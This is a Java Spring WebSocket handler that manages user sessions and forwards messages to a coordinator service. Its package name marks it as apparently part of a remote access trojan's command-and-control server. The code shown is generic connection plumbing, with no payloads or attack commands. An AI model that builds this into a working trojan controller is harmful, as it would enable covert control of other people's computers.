package devs.alex.sah.rat.c2server.webSocket.user;

import lombok.extern.slf4j.Slf4j;
import devs.alex.sah.rat.c2server.services.MessagesCoordinator;
import devs.alex.sah.rat.c2server.services.WebSocketSessionService;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.stereotype.Component;
import org.springframework.web.socket.*;
import org.springframework.web.socket.handler.AbstractWebSocketHandler;

@Slf4j
@Component
public class UserWebSocketHandler extends AbstractWebSocketHandler {

    private final WebSocketSessionService userWSSessionService;
    private final MessagesCoordinator messagesCoordinator;
    public UserWebSocketHandler(@Qualifier("userWebSocketSessionService") WebSocketSessionService webSocketSessionService,
                                MessagesCoordinator messagesCoordinator) {
        this.userWSSessionService = webSocketSessionService;
        this.messagesCoordinator = messagesCoordinator;
    }

    @Override
    public boolean supportsPartialMessages() {
        return true;
    }


    @Override
    public void handleTextMessage(WebSocketSession session, TextMessage message){
        messagesCoordinator.handleUserTextMessage(session, message);
    }

    @Override
    public void handleBinaryMessage(WebSocketSession session, BinaryMessage message){
        messagesCoordinator.handleUserBinaryMessage(session, message);
    }

    @Override
    public void handlePongMessage(WebSocketSession session, PongMessage message){
        messagesCoordinator.handlePongMessage(session, message);
    }

    @Override
    public void handleTransportError(WebSocketSession session, Throwable exception){
        log.error("TransportError: {}", exception.getMessage());
    }

    @Override
    public void afterConnectionEstablished(WebSocketSession session){
        userWSSessionService.addSession(session);
        try{ // for test
            session.sendMessage(new TextMessage((String)session.getAttributes().get("userId")));
        }catch (Exception e){
            log.error("Sooomething went wrooong ooou, ooou !");
        }
    }

    @Override
    public void afterConnectionClosed(WebSocketSession session, CloseStatus status){
        userWSSessionService.removeSession(session);
    }
}
